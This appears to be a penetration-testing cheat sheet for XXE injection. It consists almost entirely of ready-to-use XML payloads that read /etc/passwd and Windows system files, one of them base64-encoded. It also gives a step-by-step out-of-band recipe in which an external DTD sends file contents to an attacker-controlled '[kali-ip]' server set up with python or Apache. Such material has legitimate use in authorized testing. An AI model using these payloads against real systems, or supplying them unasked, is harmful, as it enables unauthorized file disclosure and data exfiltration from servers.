# **XXE**
Test for XXE when you find any XML input processing, and use carefully crafted XML payloads to detect if the parser is vulnerable to entity injection and external entity resolution.


### **Sample Payloads**
**Linux**
```
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

```
<?xml version="1.0"?>
<!DOCTYPE data [
<!ELEMENT data (#ANY)>
<!ENTITY file SYSTEM "file:///etc/passwd">
]>
<data>&file;</data>
```

```
<?xml version="1.0"?>
<!DOCTYPE response [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<response>
  <id>1</id>
  <name>Robin Marjan</name>
  <proffesion>Web Development</proffesion>
  <bio>&xxe;</bio>
  <imgPath>/assets/img/trainers/1.jpg</imgPath>
</response>
```

```
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

- Base64 decode
```
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```

**Windows**
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]><foo>&xxe;</foo>
```

```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" >
]>
<foo>&xxe;</foo>
```

#### **Out-of-Band Exploitation**
  
- 1. Create a file named external.dtd with the following content.  
```
<!ENTITY % content SYSTEM "file:///etc/passwd">
<!ENTITY % external "<!ENTITY &#37; exfil SYSTEM 'http://[kali-ip]/out?%content;'>" >
```      
- 2. Serve the external.dtd file with http

- Python
```
python3 -m http.server 80
```

- Or using Apache server
Place this on Apache webroot at /var/www/html, and start the Apache server.     

```
cd /var/www/html/
sudo mousepad external.dtd
sudo systemctl start apache2
```

- 3. Insert file in payload.   
```
<!DOCTYPE oob [
<!ENTITY % base SYSTEM "http://[kali-ip]/external.dtd"> 
%base;
%external;
%exfil;
]>
```     
- 4. Check incoming requests.              
Note that extracting file with multiple lines may not work due to encoding issues.

#### **Fuzzing XXE**
Wordlist to use in Burp Suite Intruder for fuzzing XXE: `/usr/share/seclists/Fuzzing/XXE-Fuzzing.txt`